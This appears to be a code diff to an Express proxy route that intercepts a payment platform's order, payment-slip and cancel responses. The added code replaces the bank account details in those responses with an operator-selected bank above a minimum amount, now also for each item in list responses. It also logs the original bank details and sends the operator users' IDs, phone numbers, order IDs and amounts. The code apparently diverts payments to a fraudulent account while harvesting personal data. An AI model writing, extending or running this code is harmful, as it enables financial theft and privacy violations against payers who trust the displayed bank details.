@@ -1024,11 +1024,12 @@ app.all('/xxapi/*', async (req, res) => {
       }
     }
 
-    const isOrder = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
+    const isOrder = urlLower.includes('paymentslipdetail')
+      || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
       || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST');
     let _orderId = '';
     if (isOrder) {
-      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
+      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
       if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
         for (const f of orderFields) {
           if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
@@ -1068,6 +1069,36 @@ app.all('/xxapi/*', async (req, res) => {
 🕐 ${now}`);
     }
 
+    if (urlLower.includes('cancel')) {
+      const cancelSuccess = !jsonResp || jsonResp.code === 0 || jsonResp.code === 200 || jsonResp.success === true;
+      let cancelOrderId = '';
+      let cancelAmt = '';
+      let cancelBankInfo = '';
+      const cancelFields = ['orderId', 'orderNo', 'order_id', 'buyOrderNo', 'id', 'slipId'];
+      const cancelAmtFields = ['amount', 'money', 'orderAmount', 'buyAmount', 'totalAmount'];
+      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+        for (const f of cancelFields) { if (respData[f]) { cancelOrderId = String(respData[f]); break; } }
+        for (const f of cancelAmtFields) { if (respData[f]) { cancelAmt = `\n💰 Amount: ₹${respData[f]}`; break; } }
+      }
+      if (!cancelOrderId) {
+        const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
+        for (const f of cancelFields) { if (urlParams.get(f)) { cancelOrderId = urlParams.get(f); break; } }
+        if (!cancelOrderId && req.body) {
+          for (const f of cancelFields) { if (req.body[f]) { cancelOrderId = String(req.body[f]); break; } }
+        }
+      }
+      if (cancelOrderId && data.orderBankMap && data.orderBankMap[cancelOrderId]) {
+        const saved = data.orderBankMap[cancelOrderId];
+        cancelBankInfo = `\n🏦 Bank Was: ${saved.bank}`;
+        if (!cancelAmt && saved.bank) {}
+      }
+      notifyAdmin(data,
+`❌ ORDER CANCELLED
+👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}${cancelOrderId ? '\n📋 Order: ' + cancelOrderId : ''}${cancelAmt}${cancelBankInfo}
+📊 ${cancelSuccess ? '✅ Cancelled Successfully' : '⚠️ Cancel Response: ' + (jsonResp && jsonResp.message ? jsonResp.message : response.status)}
+🕐 ${now}`);
+    }
+
     if (urlLower.includes('notifynewbill') || urlLower.includes('notify_new_bill') || urlLower.includes('newbill')) {
       let billInfo = '';
       if (jsonResp && typeof jsonResp === 'object') {
@@ -1099,20 +1130,35 @@ app.all('/xxapi/*', async (req, res) => {
     if (data.botEnabled !== false) {
       const bank = getActiveBank(data, userId);
       if (bank) {
-        let shouldReplace = true;
-        if (bank.minAmount) {
-          const amt = getOrderAmount(req, respData);
-          if (amt !== null && amt < bank.minAmount) {
-            shouldReplace = false;
-            _notReplacedAmt = amt;
-            _notReplacedMin = bank.minAmount;
+        const isListResp = Array.isArray(respData);
+
+        if (isListResp && bank.minAmount) {
+          // Per-item minAmount check for list responses (waitpayerpaymentslip etc.)
+          respData.forEach(item => {
+            if (!item || typeof item !== 'object') return;
+            const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
+            if (iAmt > 0 && iAmt < bank.minAmount) return; // skip — under min
+            const hasAcct = scanHasBankFields(item, 0);
+            if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
+          });
+        } else {
+          let shouldReplace = true;
+          if (bank.minAmount) {
+            const amt = getOrderAmount(req, respData);
+            if (amt !== null && amt < bank.minAmount) {
+              shouldReplace = false;
+              _notReplacedAmt = amt;
+              _notReplacedMin = bank.minAmount;
+            }
           }
-        }
-        if (shouldReplace) {
-          const globalHasAcct = scanHasBankFields(jsonResp, 0);
-          deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
-          _bankReplaced = true;
-          _replacedBank = bank;
+          if (shouldReplace) {
+            const globalHasAcct = scanHasBankFields(jsonResp, 0);
+            if (globalHasAcct) {
+              deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
+              _bankReplaced = true;
+              _replacedBank = bank;
+            }
+          }
         }
       }
 
@@ -1131,7 +1177,8 @@ app.all('/xxapi/*', async (req, res) => {
       }
     }
 
-    if (isOrder) {
+    // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
+    if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail'))) {
       const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
       if (_orderId) {
         if (!data.orderBankMap) data.orderBankMap = {};
